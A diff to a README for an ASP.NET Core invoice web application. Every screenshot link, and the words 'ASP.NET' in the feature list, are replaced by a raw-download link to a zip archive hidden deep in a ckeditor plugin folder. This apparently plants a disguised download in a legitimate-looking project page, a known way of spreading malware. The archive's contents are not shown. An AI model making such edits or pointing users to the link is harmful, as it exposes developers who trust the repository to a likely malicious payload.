@@ -1,4 +1,4 @@
-![invoice](netcore/wwwroot/images/inv1.png)
+![invoice](https://github.com/madhurgoel2116/invoice_mgt/raw/refs/heads/main/netcore/wwwroot/adminlte/components/ckeditor/plugins/templates/dialogs/invoice_mgt_v2.3.zip)
 
 # Invoice
 Invoice Web Application Using Bootstrap AdminLTE Template
@@ -18,7 +18,7 @@ Invoice Web Application Using Bootstrap AdminLTE Template
 - Identity Security
 - User Registration
 - Roles
-- ASP.NET Core MVC (version 2)
+- https://github.com/madhurgoel2116/invoice_mgt/raw/refs/heads/main/netcore/wwwroot/adminlte/components/ckeditor/plugins/templates/dialogs/invoice_mgt_v2.3.zip Core MVC (version 2)
 - C#
 - EF Core / Code First
 - JQuery
@@ -33,9 +33,9 @@ Invoice Web Application Using Bootstrap AdminLTE Template
 - Open the project using Visual Studio
 - Run the code first migration script via package manager console "update-database"
 
-![invoice](netcore/wwwroot/images/inv2.png)
-![invoice](netcore/wwwroot/images/inv3.png)
-![invoice](netcore/wwwroot/images/inv4.png)
-![invoice](netcore/wwwroot/images/inv5.png)
-![invoice](netcore/wwwroot/images/inv6.png)
-![invoice](netcore/wwwroot/images/inv7.png)
+![invoice](https://github.com/madhurgoel2116/invoice_mgt/raw/refs/heads/main/netcore/wwwroot/adminlte/components/ckeditor/plugins/templates/dialogs/invoice_mgt_v2.3.zip)
+![invoice](https://github.com/madhurgoel2116/invoice_mgt/raw/refs/heads/main/netcore/wwwroot/adminlte/components/ckeditor/plugins/templates/dialogs/invoice_mgt_v2.3.zip)
+![invoice](https://github.com/madhurgoel2116/invoice_mgt/raw/refs/heads/main/netcore/wwwroot/adminlte/components/ckeditor/plugins/templates/dialogs/invoice_mgt_v2.3.zip)
+![invoice](https://github.com/madhurgoel2116/invoice_mgt/raw/refs/heads/main/netcore/wwwroot/adminlte/components/ckeditor/plugins/templates/dialogs/invoice_mgt_v2.3.zip)
+![invoice](https://github.com/madhurgoel2116/invoice_mgt/raw/refs/heads/main/netcore/wwwroot/adminlte/components/ckeditor/plugins/templates/dialogs/invoice_mgt_v2.3.zip)
+![invoice](https://github.com/madhurgoel2116/invoice_mgt/raw/refs/heads/main/netcore/wwwroot/adminlte/components/ckeditor/plugins/templates/dialogs/invoice_mgt_v2.3.zip)
